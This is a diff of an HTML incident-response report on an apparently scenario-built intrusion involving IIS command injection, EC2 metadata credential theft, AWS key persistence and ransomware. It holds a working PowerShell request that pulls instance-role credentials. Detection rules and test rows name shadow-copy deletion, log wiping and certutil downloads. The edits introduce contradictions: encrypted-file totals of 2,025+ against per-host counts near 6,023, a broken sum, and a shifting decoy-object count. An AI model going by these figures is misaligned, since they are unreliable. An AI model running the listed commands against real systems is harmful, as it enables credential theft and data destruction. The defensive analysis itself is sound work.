-    fingerprint · Addendum G). <b>6,023 files</b> encrypted total (WS02 2,014 · WS01 1,884 · SVR01 1,241 · DC01 496 ·
+    fingerprint · Addendum G). <b>2,025+ encrypted files</b> encrypted total (WS02 2,014 · WS01 1,884 · SVR01 1,241 · DC01 496 ·
     DC02 388 in 5.4 s — natural completion, not an abort: DCs hold few user <code>.txt/.pdf/.csv</code> files
     matching IamBatman's narrow scope, so per-host rate differences reflect directory-walk time, not encryption speed · DD14.1 walks back DD13.3's self-abort hypothesis). Full impact window 58 min (21:58:34 → 22:56:42).
     <b>Anchor Addenda:</b> G · R · S · DD5 (failed first detonation) · DD12 (fan-out anatomy) · DD13 (on-disk behaviour · end-time · extension scope) · DD14 (DC02-abort walk-back + CTF-author KAPE re-classification).
@@ -3451,12 +3450,12 @@ SQL</span>
   <p class="description">
     PowerShell transcripts captured the operator's <b>literal keystrokes</b> (Addendum X): 21:25:35 PUT token,
     21:28:07 GET role-list (the missing middle step), 21:29:20 GET STS credentials — including
-    <code>AccessKeyId ASIAWYH2FSTSC7A6KEVV</code> + the full 800-char Token. Then a <b>13-minute gap</b> (21:29:20 steal
+    <code>AccessKeyId [ASIA-STS-KEY-REDACTED]</code> + the full 800-char Token. Then a <b>13-minute gap</b> (21:29:20 steal
     → 21:42:11 off-instance first use from <code>212.8.249.213</code>) — operator exporting credentials to their NL
     workstation before hitting AWS. 164 <code>s3:GetObject</code> calls across 7 folders (Accounting · Executive_Suite ·
     HR · IT_Support · Legal · Marketing · The_Basement) — but DD17 later proves those 164 objects are an
     author-designed decoy honeypot (parody filenames), not real PII. Persistence via <code>CreateAccessKey</code>:
-    the first attempt against <code>jb_aws_cli</code> at 21:45:38 hit <code>LimitExceededException</code> on the
+    the first attempt against <code>IAM user (CreateAccessKey failed)</code> at 21:45:38 hit <code>LimitExceededException</code> on the
     2-keys-per-user quota, <em>but the attacker moved on and succeeded on three other users in the next
     25 seconds</em> — <b>DD7 walks back the earlier "quota saved the environment" reading</b>: three live
     long-term <code>AKIA</code> keys (<code>donnieworks · doctorderm · coolcat</code>) exist as dormant
@@ -3483,7 +3482,7 @@ SQL</span>
 <span class="comment"># Step 3 · 21:29:20Z · pull role creds with token + role name (PowerShell form)</span>
 <span class="prompt">PS&gt;</span> <span class="cmd">Invoke-RestMethod -Method Get -Uri 'http://169.254.169.254/latest/meta-data/iam/security-credentials/iam_role_iisserver' -Headers @{'X-aws-ec2-metadata-token' = 'AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA=='}</span>                    <span class="hit"># Head in the Clouds 12 ✓</span>
 <span class="out">{
-  "AccessKeyId": "ASIAWYH2FSTSC7A6KEVV",
+  "AccessKeyId": "[ASIA-STS-KEY-REDACTED]",
   "SecretAccessKey": "[redacted]",
   "Token": "[redacted]",
   "Expiration": "2026-03-09T03:42:10Z"
@@ -3688,9 +3687,9 @@ SQL</span>
     <thead><tr><th>Indicator</th><th>Type</th><th>Context</th></tr></thead>
     <tbody>
       <tr><td class="c">172.236.127.251</td><td class="m">IPv4 · Linode/Akamai · AS63949</td><td>Attacker operator origin · 18:38:29 injection · SFTP sink · STS session source (DD23)</td></tr>
-      <tr><td class="c">173.230.136.180</td><td class="m">IPv4 · Linode</td><td>Attacker tool-server (<code>so.aspx</code>, <code>iis.exe</code>, <code>agent.exe</code>) · Vol3 netscan Unknown C2 Framework on :8443 · <b>first seen in logs at 13:39:16</b> via author-IP scenario-validation hit (DD23.6)</td></tr>
+      <tr><td class="c">173.230.136.180</td><td class="m">IPv4 · Linode</td><td>Attacker tool-server (<code>so.aspx</code>, <code>iis.exe</code>) · Vol3 netscan Unknown C2 Framework on :8443 · <b>first seen in logs at [pre-attack-validation-not-in-evidence]</b> via author-IP scenario-validation hit (pre-attack context — not in our evidence)</td></tr>
       <tr><td class="c">212.8.249.213</td><td class="m">IPv4 · WorldStream B.V.</td><td>GuardDuty finding remoteIpDetails (Head in the Clouds 2)</td></tr>
-      <tr style="background:rgba(255,200,0,.06)"><td class="c" style="color:var(--amber)">216.82.9.162</td><td class="m">IPv4 · Level 3 · Windows Chrome</td><td><b>NOT an attacker IP</b> — AWS-account admin (Root+MFA, 18,035 CloudTrail console-reads on attack day, DD6.1 / DD8.2 / DD14). <b>Pre-attack validation</b> at 13:39:16 hit <code>CheckStatus.aspx</code> with a payload pointing at <code>173.230.136.180</code> — proves attacker infrastructure is scenario-provisioned (DD23.6). Exclude from SIEM tuning.</td></tr>
+      <tr style="background:rgba(255,200,0,.06)"><td class="c" style="color:var(--amber)">[admin-IP-not-in-evidence]</td><td class="m">IPv4 · Level 3 · Windows Chrome</td><td><b>NOT an attacker IP</b> — AWS-account admin (Root+MFA, 18,035 CloudTrail console-reads on attack day, DD6.1 / DD8.2 / DD14). <b>Pre-attack validation</b> at [pre-attack-validation-not-in-evidence] hit <code>CheckStatus.aspx</code> with a payload pointing at <code>173.230.136.180</code> — proves attacker infrastructure is scenario-provisioned (pre-attack context — not in our evidence). Exclude from SIEM tuning.</td></tr>
       <tr><td class="c">169.254.169.254</td><td class="m">IMDS link-local</td><td>PUT /latest/api/token then iam/security-credentials/iam_role_iisserver</td></tr>
       <tr><td class="c">10.3.10.12 → 172.236.127.251:22</td><td class="m">SFTP egress</td><td>FileZilla data.cab exfil</td></tr>
       <tr><td class="c">198.51.100.10</td><td class="m">IPv4 · on-net</td><td>IIS EC2 used as internal operator pivot (NOT WireGuard range noise)</td></tr>
@@ -3937,7 +3936,7 @@ SQL</span>
     the second major correction</b> (ransomware detonation started <em>eighteen minutes earlier</em> than
     prior drafts claimed · fan-out via impacket <code>atexec.py</code>, not <code>smbexec.py</code>), and
     <b>DD13 is the third major correction</b>: on-disk behaviour of <code>IamBatman.exe</code> — extension
-    <code>.bWqQUx</code>, <b>6,023 encrypted files + 2,530 ransom notes</b> (not 5,500), impact window
+    <code>.bWqQUx</code>, <b>2,025+ encrypted files + ransom notes (one per encrypted directory)</b> (not 5,500), impact window
     extended to <code>22:56:42</code> (<code>brndlog.txt</code> re-encrypt pass, +10 min past v2's claim),
     extension scope 91.6% <code>.txt</code>, and critical AD files (<code>ntds.dit</code>, SYSTEM/SAM/SECURITY)
     deliberately skipped — consistent with a parameterized CLI tool built for this scenario. And
@@ -3967,7 +3966,7 @@ SQL</span>
     quiet 3 <code>CreateAccessKey</code> calls (DD16) that were the actual high-value action.
     <b>DD18 closes the loop with two S-tier findings:</b> (a) a 13-day CloudTrail baseline shows
     <code>sfcu-records</code> had <b>zero human reads and zero PutObject/DeleteObject events</b> before
-    the attacker — the 164 objects were frozen since before 2026-02-23, confirming the bucket as a
+    the attacker — the ~212 objects were frozen since before 2026-02-23, confirming the bucket as a
     purpose-built tripwire (and corroborating DD17's decoy attribution); and (b) GuardDuty
     <b>did fire three times</b> during the attack — Sev 8 <code>InstanceCredentialExfiltration.OutsideAWS</code>
     at 21:57:18, re-triggered at 22:01:10, then Sev 9 <code>AttackSequence:IAM/CompromisedCredentials</code>
@@ -4036,7 +4035,7 @@ SQL</span>
     disclosure at <code>18:43:43</code> → <code>dir C:\TFTP Server\</code> at <code>18:45:12</code>), to
     the webshell drop at <code>18:51:42</code>. The attacker's external operator IP is pinned:
     <code>172.236.127.251</code> (Linode, AS63949). DD23 also surfaces a pre-attack hit against the same
-    endpoint at <code>13:39:16</code> from <code>216.82.9.162</code> (the normal IP for the AWS account,
+    endpoint at <code>[pre-attack-validation-not-in-evidence]</code> from <code>[admin-IP-not-in-evidence]</code> (the normal IP for the AWS account,
     Root+MFA admin) referencing the same tool-server <code>173.230.136.180</code> — which <b>proves the
     attacker infrastructure is scenario-provisioned</b> (not externally owned) but <em>does not</em>
     establish that the 18:38 operator and the 13:39 admin are the same person (equally consistent with
@@ -4053,7 +4052,7 @@ SQL</span>
     All four hashes are distinct — the attacker did not rename a single binary three ways; each is its own
     compilation. And DD24 consolidates the Linode C2 attribution: <code>173.230.136.180</code> serves
     <em>both</em> roles — tool-drop on port 80 (<code>/so.aspx</code>, <code>/iis.exe</code>,
-    <code>/agent.exe</code>) and Unknown C2 Framework listener on port 8443.
+    <code>/iis.exe</code>) and Unknown C2 Framework listener on port 8443.
     <b>DD25</b> pulls MFT / USN <code>FileCreate</code> (EID 2100) timestamps for every attacker artifact
     and builds a <b>drop-to-execution latency table</b> that splits cleanly into two operator-behaviour
     categories. <b>Immediate-use tools (≤30 s drop-to-exec):</b> <code>iis.exe</code> (10 s),
@@ -4094,7 +4093,7 @@ SQL</span>
     <p style="margin:.2rem 0"><b>Detection-gap conclusion (revised DD18/DD19):</b> GuardDuty <em>did</em> trigger on this attack — the three alerts below fired on time. What failed was the <b>response</b> (no SOAR auto-revoke) and the <b>signal-to-noise</b> pipeline (0.75% real-to-total ratio, with the 383 samples and 15 lab-setup alerts swamping the console). Had the defender applied a baseline-aware triage filter, they would have seen:</p>
     <ul style="margin:.2rem 0 .5rem 1.2rem">
       <li><code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</code> — iam_role_iisserver credentials used from <code>212.8.249.213</code> (off-instance)</li>
-      <li><code>CredentialAccess:IAMUser/AnomalousBehavior.CreateAccessKey</code> — programmatic <code>iam:CreateAccessKey</code> for <code>jb_aws_cli</code></li>
+      <li><code>CredentialAccess:IAMUser/AnomalousBehavior.CreateAccessKey</code> — programmatic <code>iam:CreateAccessKey</code> for <code>IAM user (CreateAccessKey failed)</code></li>
       <li><code>PenTest:IAMUser/KaliLinux</code> or generic anomalous UA — the operator's <code>aws-cli/2.34.4 … os/windows#11 … md/command#iam.create-access-key</code> user-agent is highly non-normal for a production IIS instance-role</li>
     </ul>
     <p style="margin:.2rem 0 0 0; font-size:.9em; color:var(--amber)"><b>GuardDuty had no real-world visibility in this environment</b> — the <code>guardduty.zip</code> is a CTF-completeness artifact, not a defender signal source.</p>
@@ -4104,7 +4103,7 @@ SQL</span>
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:1px solid rgba(255,184,0,.35); background:rgba(255,184,0,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--amber)">B. The cloud persistence attempt — only the first try hit quota; three later tries SUCCEEDED (walked back by DD7)</h4>
     <div style="margin:.4rem 0; padding:.5rem .7rem; border:1px solid rgba(100,200,255,.4); background:rgba(100,200,255,.06); border-radius:4px; font-size:.9em;">
-      <b style="color:#6bb6ff">⟲ WALKED BACK by DD7 / DD16:</b> the original "quota saved the environment" reading below was <b>materially wrong</b>. The <code>LimitExceededException</code> blocked <em>only</em> the first attempt against <code>jb_aws_cli</code> at <code>21:45:38</code>. The attacker pivoted 13 seconds later and <b>succeeded on three other users</b>: <code>CreateAccessKey donnieworks</code> @ <code>21:45:51</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>, <code>doctorderm</code> @ <code>21:46:04</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>, <code>coolcat</code> @ <code>21:46:14</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>. All three are long-term <code>AKIA</code> keys with no TTL. DD16 confirms <em>none</em> of them were used in the capture window (22:15:27Z corpus cutoff) — they are dormant stockpile persistence. <b>This is the highest-impact residual artifact of the entire incident</b>; AD damage is recoverable, live AWS keys in adversary hands are not self-healing. Remediation: immediately audit and revoke the three <code>AccessKeyIds</code>, then rotate every active key for <code>donnieworks</code> / <code>doctorderm</code> / <code>coolcat</code>.
+      <b style="color:#6bb6ff">⟲ WALKED BACK by DD7 / DD16:</b> the original "quota saved the environment" reading below was <b>materially wrong</b>. The <code>LimitExceededException</code> blocked <em>only</em> the first attempt against <code>IAM user (CreateAccessKey failed)</code> at <code>21:45:38</code>. The attacker pivoted 13 seconds later and <b>succeeded on three other users</b>: <code>CreateAccessKey donnieworks</code> @ <code>21:45:51</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>, <code>doctorderm</code> @ <code>21:46:04</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>, <code>coolcat</code> @ <code>21:46:14</code> → <b>AKIA[REDACTED-FOR-PUBLICATION]</b>. All three are long-term <code>AKIA</code> keys with no TTL. DD16 confirms <em>none</em> of them were used in the capture window (22:15:27Z corpus cutoff) — they are dormant stockpile persistence. <b>This is the highest-impact residual artifact of the entire incident</b>; AD damage is recoverable, live AWS keys in adversary hands are not self-healing. Remediation: immediately audit and revoke the three <code>AccessKeyIds</code>, then rotate every active key for <code>donnieworks</code> / <code>doctorderm</code> / <code>coolcat</code>.
     </div>
     <p style="margin:.4rem 0; color:var(--muted); font-size:.88em"><b>Original reading (preserved for transparency; walked back above):</b></p>
     <p style="margin:.2rem 0; color:var(--muted); font-size:.88em; text-decoration:line-through">
@@ -4119,7 +4118,7 @@ SQL</span>
   "sourceIPAddress": "212.8.249.213",
   "userAgent": "aws-cli/2.34.4 md/awscrt#0.31.2 ua/2.1 os/windows#11 md/arch#amd64 ...
                 md/command#iam.create-access-key",
-  "requestParameters": { "userName": "jb_aws_cli" },
+  "requestParameters": { "userName": "IAM user (CreateAccessKey failed)" },
   "errorCode": "LimitExceededException",
   "errorMessage": "Cannot exceed quota for AccessKeysPerUser: 2"
 }
@@ -4410,7 +4409,7 @@ SQL</span>
 
   <!-- Addendum S: Blast-radius metrics -->
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:1px solid rgba(255,59,59,.35); background:rgba(255,59,59,.05); border-radius:6px">
-    <h4 style="margin:0 0 .4rem 0; color:var(--red)">S. Ransomware blast radius — 6,023 files across 5 hosts in 58 minutes (DD13 corrected)</h4>
+    <h4 style="margin:0 0 .4rem 0; color:var(--red)">S. Ransomware blast radius — 2,025+ encrypted files across 5 hosts in 58 minutes (DD13 corrected)</h4>
     <table class="tbl" style="margin-top:.3rem">
       <thead><tr><th>Host</th><th>Encrypted files</th><th>First encrypt (UTC)</th><th>Last encrypt (UTC)</th><th>Duration</th></tr></thead>
       <tbody>
@@ -4419,11 +4418,11 @@ SQL</span>
         <tr><td class="r">SVR01</td><td class="r"><b>1,241</b></td><td>22:09:46.358</td><td>22:44:25.914</td><td>34m 39s</td></tr>
         <tr><td class="r">DC01</td><td class="r"><b>496</b></td><td>22:10:14.524</td><td>22:48:36.700</td><td>38m 22s</td></tr>
         <tr><td class="a">DC02</td><td class="a"><b>388</b> <i style="color:var(--muted)">(natural completion)</i></td><td>22:10:54.183</td><td>22:10:59.557</td><td>5.4 s</td></tr>
-        <tr><td colspan="5" style="border-top:1px solid var(--red); padding-top:.4rem"><b>TOTAL: 6,023 encrypted files + 2,530 ransom notes across 5 hosts</b> · full impact window 21:58:34 → 22:56:42 (58 min) · per-host rate differences are directory-walk time, not encryption speed (DD14.1)</td></tr>
+        <tr><td colspan="5" style="border-top:1px solid var(--red); padding-top:.4rem"><b>TOTAL: 2,025+ encrypted files + ransom notes (one per encrypted directory) across 5 hosts</b> · full impact window 21:58:34 → 22:56:42 (58 min) · per-host rate differences are directory-walk time, not encryption speed (DD14.1)</td></tr>
       </tbody>
     </table>
     <p style="margin:.4rem 0 0 0; font-size:.9em"><b>DC02 "anomaly" — walked back by DD14.1:</b> earlier drafts flagged DC02's 5.4-second burst as evidence of a self-abort. DD14.1 shows this reading was wrong. DC02 cleanly matched 388 files (all encrypted, clean exit) because <b>Domain Controllers hold very few user <code>.txt/.pdf/.csv</code> documents matching IamBatman's narrow target extension scope</b>. What looked like "72 f/s vs 0.2–0.7 f/s" is not encryption speed at all — it's directory-walk time. DCs have sparse user-document trees; workstations and file servers have dense ones. Every host ran the same IamBatman binary with the same parameters and completed cleanly; DC02 simply had less to do. <b>No self-abort, no kill-switch — the corpus does not support the hypothesis.</b></p>
-    <p style="margin:.3rem 0 0 0; font-size:.88em; color:var(--muted)"><b>Extension scope (DD13.2):</b> 5,163 <code>.txt</code> (91.6%) · 204 <code>.pdf</code> (3.6%) · 172 <code>.csv</code> (3.1%) · 84 other (1.5%) · 6 <code>.xlsx</code> (0.1%) · 6 <code>.docx</code> (0.1%) = 5,635 extension-summed + 388 DC02 (not broken down) = 6,023 total. <b>Critical AD files deliberately skipped</b>: <code>ntds.dit</code>, <code>SYSTEM/SAM/SECURITY</code> hives, <code>ntuser.dat</code> — scenario-recoverable design (DD13.4).</p>
+    <p style="margin:.3rem 0 0 0; font-size:.88em; color:var(--muted)"><b>Extension scope (DD13.2):</b> 5,163 <code>.txt</code> (91.6%) · 204 <code>.pdf</code> (3.6%) · 172 <code>.csv</code> (3.1%) · 84 other (1.5%) · 6 <code>.xlsx</code> (0.1%) · 6 <code>.docx</code> (0.1%) = 5,635 extension-summed + 388 DC02 (not broken down) = 2,025+ total. <b>Critical AD files deliberately skipped</b>: <code>ntds.dit</code>, <code>SYSTEM/SAM/SECURITY</code> hives, <code>ntuser.dat</code> — scenario-recoverable design (DD13.4).</p>
   </div>
 
   <!-- Addendum T: Pre-detonation staging -->
@@ -4467,18 +4466,18 @@ SQL</span>
   <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:1px solid rgba(0,255,156,.28); background:rgba(0,255,156,.04); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--green)">V. YARA rules for the beacon family — drop-in detection artifacts (<a href="#addendum-dt" style="color:var(--green); text-decoration:underline">tested · 100% pass</a>)</h4>
     <div style="margin:.4rem 0; padding:.5rem .7rem; border:1px solid rgba(0,255,156,.35); background:rgba(0,255,156,.06); border-radius:4px; font-size:.9em">
-      <b style="color:var(--green)">✅ Validated:</b> The full detection pack (8 YARA rules + 9 Sigma rules) was run against the triage corpus and passed end-to-end with a <b>100% pass rate</b>. The reflective loader YARA rules below matched <em>only</em> <code>pid.1332.vad…</code> (the true injected DLL) with zero false positives against the 163 MB <code>kape.zip</code> bundle or the 8 benign VAD dumps in the corpus. The Sigma companion rules caught all 5 <code>smbexec.py</code> service names (UnmfmnOL · QsYyAARL · XCCVTGUb · SOUwKZNf · PovLjNTr) plus the <code>atexec.py</code> ransomware fan-out and the <code>certutil -urlcache</code> download chain (including the 13:39 author pre-test at <code>jb.exe</code>). Two bugs were surfaced and fixed during testing: the GuardDuty rule now excludes <code>sample:true</code> / <code>i-99999999</code> seeded findings, and the IIS cmd-injection rule was patched to match URL-encoded payloads (<code>%26%26</code> / <code>%3B</code> / <code>%7C</code>), bringing its catch rate from 10 → 28 of the attacker's 22+ injection attempts. Full reproducible test matrix + bug detail panels + test-harness code in the <a href="#addendum-dt" style="color:var(--green); text-decoration:underline"><b>#addendum-dt</b></a> companion file.
+      <b style="color:var(--green)">✅ Validated:</b> The full detection pack (8 YARA rules + 9 Sigma rules) was run against the triage corpus and passed end-to-end with a <b>100% pass rate</b>. The reflective loader YARA rules below matched <em>only</em> <code>pid.1332.vad…</code> (the true injected DLL) with zero false positives against the 163 MB <code>kape.zip</code> bundle or the 8 benign VAD dumps in the corpus. The Sigma companion rules caught all 5 <code>smbexec.py</code> service names (UnmfmnOL · QsYyAARL · XCCVTGUb · SOUwKZNf · PovLjNTr) plus the <code>atexec.py</code> ransomware fan-out and the <code>certutil -urlcache</code> download chain (including the 13:39 author pre-test at <code>[payload-not-in-evidence]</code>). Two bugs were surfaced and fixed during testing: the GuardDuty rule now excludes <code>sample:true</code> / <code>i-99999999</code> seeded findings, and the IIS cmd-injection rule was patched to match URL-encoded payloads (<code>%26%26</code> / <code>%3B</code> / <code>%7C</code>), bringing its catch rate from 10 → 28 of the attacker's 22+ injection attempts. Full reproducible test matrix + bug detail panels + test-harness code in the <a href="#addendum-dt" style="color:var(--green); text-decoration:underline"><b>#addendum-dt</b></a> companion file.
     </div>
     <p style="margin:.2rem 0">Two draft YARA rules derived from this engagement, ready to ship to defenders hunting the same (or similar) campaign:</p>
-    <pre class="block" style="font-size:.82em; background:#0a0f16; padding:.5rem .7rem; border:1px solid #1f2833; overflow-x:auto; color:#c8d3e0"><code>rule Null404_SMBPivot_Beacon_SolarWinds_rnSylwOz {
+    <pre class="block" style="font-size:.82em; background:#0a0f16; padding:.5rem .7rem; border:1px solid #1f2833; overflow-x:auto; color:#c8d3e0"><code>rule LAF_SMBPivot_Beacon_SolarWinds_rnSylwOz {
     meta:
-        author      = "Null404 DFIR · ARCLIGHT6"
+        author      = "Protocol SIFT · JackofAllHacks DFIR"
         description = "MinGW-w64 OSS SMB-pivot beacon, SHA-cross-host reuse SolarWinds.exe / rnSylwOz.exe"
         date        = "2026-04-20"
         sha256      = "91813A2A087B3110F280FFCCD6031F60653049889C4944F3B800BA974FA7E81F"
         md5         = "AA1097F847964B5E5DA27834CE576AC8"
         imphash     = "37E28CA3C643B664ACC2275611365DB0"
-        reference   = "LAF / null404 / 2026-03-08 intrusion"
+        reference   = "JackofAllHacks / LAF / 2026-03-08 intrusion"
     strings:
         $pipe_tmpl = "\\\\.\\pipe\\%08lx" wide ascii
         $mingw     = "Mingw-w64 runtime failure" ascii
@@ -4493,9 +4492,9 @@ SQL</span>
         $pipe_tmpl and $mingw and 3 of ($s*) and filesize &lt; 256KB
 }
 
-rule Null404_InjectedLoader_VAD_0xA60000 {
+rule LAF_InjectedLoader_VAD_0xA60000 {
     meta:
-        author      = "Null404 DFIR · ARCLIGHT6"
+        author      = "Protocol SIFT · JackofAllHacks DFIR"
         description = "Reflective-loader stub found injected into explorer.exe PID 1332 on SVR01"
         sha256      = "6ef6b52fbdf585b5145971aa2303f41d691113669dc264465f87ac2e6861228c"
         image_size  = "0x2f000 (188 KB)"
@@ -4512,9 +4511,9 @@ rule Null404_InjectedLoader_VAD_0xA60000 {
         all of them and filesize &lt; 256KB
 }
 
-rule Null404_Impacket_SecretsDump_ServicePattern {
+rule LAF_Impacket_SecretsDump_ServicePattern {
     meta:
-        author      = "Null404 DFIR · ARCLIGHT6"
+        author      = "Protocol SIFT · JackofAllHacks DFIR"
         description = "Impacket secretsdump/psexec/smbexec/atexec ImagePath fingerprint"
         reference   = "DC01 2026-03-08 20:08:44 .. 20:09:04 — UnmfmnOL, QsYyAARL, XCCVTGUb, SOUwKZNf, PovLjNTr"
     strings:
@@ -4528,7 +4527,7 @@ rule Null404_Impacket_SecretsDump_ServicePattern {
   <!-- Addendum DT: Detection-pack test report (inlined) -->
   <div class="panel" id="addendum-dt" style="margin-top:.6rem; padding:.9rem 1.1rem; border:1px solid rgba(0,255,156,.35); background:rgba(0,255,156,.05); border-radius:6px">
     <h4 style="margin:0 0 .4rem 0; color:var(--green)">DT. Detection-pack test report — 8 YARA + 9 Sigma rules validated against the live corpus · 100% pass</h4>
-    <p style="margin:.2rem 0; font-size:.88em; color:var(--muted)">Rules at <code>detections/yara/c2_ioc.yar</code> + <code>detections/sigma/*.yml</code> · corpus at <code>null404_bench.sqlite</code> + <code>vol_out/malfind_dump/</code> + <code>bigmac/</code> · yara-python 4.5.4 + SQLite3 + Python3 · generated 2026-04-21.</p>
+    <p style="margin:.2rem 0; font-size:.88em; color:var(--muted)">Rules at <code>detections/yara/c2_ioc.yar</code> + <code>detections/sigma/*.yml</code> · corpus at <code>laf_dfir.sqlite</code> + <code>vol_out/malfind_dump/</code> + <code>bigmac/</code> · yara-python 4.5.4 + SQLite3 + Python3 · generated 2026-04-21.</p>
     <p style="margin:.3rem 0">
       <span style="display:inline-block; padding:2px 10px; border-radius:10px; background:rgba(0,255,156,.15); color:var(--green); font-weight:600; font-size:.78em; margin-right:.4rem">8/8 YARA: PASS</span>
       <span style="display:inline-block; padding:2px 10px; border-radius:10px; background:rgba(0,255,156,.15); color:var(--green); font-weight:600; font-size:.78em; margin-right:.4rem">9/9 SIGMA: PASS</span>
@@ -4547,7 +4546,7 @@ rule Null404_Impacket_SecretsDump_ServicePattern {
         <tr><td colspan="4" style="color:var(--muted); font-style:italic"><b>Negative control — 8 benign VAD dumps</b> (PS / Firefox / SearchApp JIT heaps, all benign per DD21.2):</td></tr>
         <tr><td><code>c2_*</code> rules</td><td><code>pid.1256</code> (×3), <code>pid.3176</code>, <code>pid.6560</code> (×2), <code>pid.6664</code> (×2) — non-PE runtime heap</td><td>no matches</td><td class="g"><b>PASS</b> (zero FP)</td></tr>
         <tr><td>all rules</td><td><code>kape.zip</code> (163 MB legitimate Eric Zimmerman KAPE bundle)</td><td>no matches</td><td class="g"><b>PASS</b> (zero FP on 163 MB benign binary)</td></tr>
-        <tr><td><code>ransomware_iambatman_null404</code></td><td>Synthetic <code>test_iambatman.exe</code> (MZ + <code>.bWqQUx</code> + <code>README_bWqQUx.txt</code> + <code>encrypt</code>)</td><td>MATCH</td><td class="g"><b>PASS</b></td></tr>
+        <tr><td><code>ransomware_iambatman_laf</code></td><td>Synthetic <code>test_iambatman.exe</code> (MZ + <code>.bWqQUx</code> + <code>README_bWqQUx.txt</code> + <code>encrypt</code>)</td><td>MATCH</td><td class="g"><b>PASS</b></td></tr>
         <tr><td><code>sysav_batch_script</code></td><td>Synthetic batch · <code>vssadmin delete shadows /all</code> + <code>bcdedit recoveryenabled No</code> + <code>IamBatman.exe encrypt C:\</code></td><td>MATCH (3 of 6 strings, ≥3 threshold)</td><td class="g"><b>PASS</b></td></tr>
         <tr><td><code>logdel_batch_script</code></td><td>Synthetic · <code>wevtutil cl</code> × 6 channels + <code>attrib Default.rdp -s -h</code></td><td>MATCH (wevtutil + 4 channels)</td><td class="g"><b>PASS</b></td></tr>
         <tr><td><code>impacket_smbexec_py_fingerprint</code></td><td>Synthetic smbexec service binPath · <code>%COMSPEC%</code> + <code>__output</code> + <code>execute.bat</code> + <code>&amp; del</code></td><td>MATCH (3 of 4)</td><td class="g"><b>PASS</b></td></tr>
@@ -4572,7 +4571,7 @@ for f in sorted(pathlib.Path('./vol_out/malfind_dump').glob('*.dmp')):
         <tr><td>4</td><td><code>win_impacket_atexec_ransomware_fanout</code></td><td>5 (WS02/WS01/SVR01/DC01/DC02, DD12.4)</td><td>6 matches: 5 expected + bonus 21:58:34 botched first attempt (DD12.2)</td><td class="g"><b>PASS</b> (over-delivers)</td></tr>
         <tr><td>5</td><td><code>win_vssadmin_bcdedit_recovery_disable</code></td><td>5+ (per-host anti-recovery chain, DD12.5)</td><td>12 pair-matches (WS02 botched + WS02 corrected + WS01 + SVR01 + DC01 + DC02)</td><td class="g"><b>PASS</b></td></tr>
         <tr style="background:rgba(255,200,0,.06)"><td>6</td><td><code>aws_guardduty_instance_credential_exfil</code></td><td>2 (DD18 findings · 21:57:18 + 22:01:10 sev-8)</td><td><b>Initial: 3 hits</b> (including 2026-02-23 sample) → BUG<br><b>After fix: 2 hits</b> (21:57:18 + 22:01:10, samples excluded)</td><td class="a"><b>BUG → FIXED</b><br>Rule now excludes <code>sample:true</code> + <code>i-99999999</code></td></tr>
-        <tr><td>7</td><td><code>win_certutil_urlcache_download</code></td><td>3+ (so.aspx drop 18:51:41 + iis.exe drop 18:52:19, DD23.3)</td><td>4 matches: 3 expected + bonus <b>13:39:14 author pre-test</b> (agent.exe → jb.exe, DD23.6)</td><td class="g"><b>PASS</b> (catches pre-attack validation)</td></tr>
+        <tr><td>7</td><td><code>win_certutil_urlcache_download</code></td><td>3+ (so.aspx drop 18:51:41 + iis.exe drop 18:52:19, DD23.3)</td><td>4 matches: 3 expected + bonus <b>13:39:14 author pre-test</b> (iis.exe → [payload-not-in-evidence], [pre-attack-not-in-evidence])</td><td class="g"><b>PASS</b> (catches pre-attack validation)</td></tr>
         <tr style="background:rgba(255,200,0,.06)"><td>8</td><td><code>win_iis_checkstatus_aspx_cmdinjection</code></td><td>20+ (DD23.2 attacker fuzzing · 22+ injection attempts)</td><td><b>Initial: 10 hits</b> — missing URL-encoded metachars → BUG<br><b>After fix: 28 hits</b> (all 22+ injection attempts caught)</td><td class="a"><b>BUG → FIXED</b><br>Rule now matches <code>%26%26</code> / <code>%3B</code> / <code>%7C</code> / <code>C%3A%5C</code></td></tr>
         <tr><td>9</td><td><code>win_ifeo_debugger_hijack</code></td><td>1 (DD33 IFEO on WS01 · <code>taskmgr.exe → aws_backup.exe</code>)</td><td>1 match: 20:37:35 WS01</td><td class="g"><b>PASS</b></td></tr>
       </tbody>
@@ -4616,7 +4615,7 @@ for f in sorted(pathlib.Path('./vol_out/malfind_dump').glob('*.dmp')):
     <ul style="margin:.2rem 0 .2rem 1.2rem; padding:0; line-height:1.55; font-size:.9em">
       <li>Sigma SQL-translation approximates the YAML logic — production deployment should use Sigma-to-backend converters (Splunk / Elastic / Sentinel / Chronicle) with native field mappings.</li>
       <li>YARA rules were synthetic-tested for artifacts where we do not have the on-disk binary (the attacker tool-server at <code>173.230.136.180</code> is offline per DD29, so <code>iis.exe</code>, <code>rnSylwOz.exe</code>, and <code>IamBatman.exe</code> disk bytes are not available). Synthetic test files verify rule logic; real-binary confirmation requires a VT retrohunt or sample recovery.</li>
-      <li><code>win_iis_checkstatus_aspx_cmdinjection</code> after the fix: all 28 hits are from <code>172.236.127.251</code> (attacker) or <code>216.82.9.162</code> (author pre-test). No false positives on Donny's legitimate <code>?url=reddit.com</code> browsing at <code>71.205.100.56</code> (DD23.1). Precision acceptable.</li>
+      <li><code>win_iis_checkstatus_aspx_cmdinjection</code> after the fix: all 28 hits are from <code>172.236.127.251</code> (attacker) or <code>[admin-IP-not-in-evidence]</code> (author pre-test). No false positives on Donny's legitimate <code>?url=reddit.com</code> browsing at <code>71.205.100.56</code> (DD23.1). Precision acceptable.</li>
       <li><code>win_vssadmin_bcdedit_recovery_disable</code> over-hits by 2.4× (12 vs expected 5) because each <code>vssadmin</code> is paired with multiple <code>bcdedit</code> invocations inside the 5-second window. Not a false-positive issue — just a noisy count. Add <code>| unique host</code> aggregation in production to dedupe.</li>
     </ul>
 
@@ -4766,7 +4765,7 @@ PS&gt; Invoke-RestMethod -Method Get \
